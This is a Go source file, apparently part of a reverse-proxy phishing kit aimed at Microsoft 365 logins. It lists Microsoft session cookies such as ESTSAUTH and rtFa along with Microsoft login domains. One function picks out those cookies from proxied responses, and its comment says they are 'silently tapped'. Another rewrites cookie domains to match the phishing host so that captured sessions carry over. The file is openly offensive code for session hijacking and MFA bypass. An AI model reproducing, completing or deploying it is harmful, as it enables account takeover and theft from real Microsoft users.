package inject

import (
	"net/http"
	"strings"
)

/* ✅ Trimmed session-relevant Microsoft auth cookies */
var authCookies = map[string]struct{}{
	"ESTSAUTH":           {},
	"ESTSAUTHPERSISTENT": {},
	"ESTSAUTHLIGHT":      {},
	"MSPAuth":            {},
	"MSCC":               {},
	"SPOIDCRL":           {},
	"rtFa":               {},
	"MS0Auth":            {},
}

/* ✅ Target domains of interest for Microsoft */
var msDomains = []string{
	".login.microsoftonline.com",
	".microsoftonline.com",
	".microsoft.com",
	"admin.microsoft.com",
	"m365.cloud.microsoft",
}

func interestingDomain(d string) bool {
	d = strings.ToLower(strings.TrimSpace(d))
	for _, want := range msDomains {
		if strings.HasSuffix(d, want) {
			return true
		}
	}
	return false
}

/* ✅ Tap only relevant Microsoft session cookies */
func TapMicrosoftAuthCookies(h http.Header) {
	for _, sc := range h.Values("Set-Cookie") {
		pair := strings.SplitN(sc, ";", 2)[0]
		kv := strings.SplitN(pair, "=", 2)
		if len(kv) != 2 {
			continue
		}
		name := strings.TrimSpace(kv[0])

		domain := ""
		for _, seg := range strings.Split(sc, ";") {
			seg = strings.TrimSpace(seg)
			if strings.HasPrefix(strings.ToLower(seg), "domain=") {
				domain = seg[7:]
				break
			}
		}

		if _, ok := authCookies[name]; ok && interestingDomain(domain) {
			// matched — silently tapped
		}
	}
}

/* ✅ Rewrite cookie domains to match phishing host */
func RewriteCookieDomains(h http.Header, mitmHost string) {
	root := rootDomain(mitmHost)
	if root == "" {
		return
	}

	out := make([]string, 0, len(h.Values("Set-Cookie")))

	for _, sc := range h.Values("Set-Cookie") {
		parts := strings.Split(sc, ";")

		for i, seg := range parts {
			seg = strings.TrimSpace(seg)
			if !strings.HasPrefix(strings.ToLower(seg), "domain=") {
				continue
			}

			orig := strings.TrimPrefix(seg[7:], ".")
			labels := strings.Split(orig, ".")
			if len(labels) < 3 {
				break
			}

			ldot := strings.HasPrefix(seg[7:], ".")
			sub := strings.Join(labels[:len(labels)-2], ".")
			newDom := sub + "." + root
			if ldot {
				newDom = "." + newDom
			}
			parts[i] = " Domain=" + newDom
			break
		}
		out = append(out, strings.Join(parts, ";"))
	}

	if len(out) == 0 {
		return
	}
	h.Del("Set-Cookie")
	for _, v := range out {
		h.Add("Set-Cookie", v)
	}
}
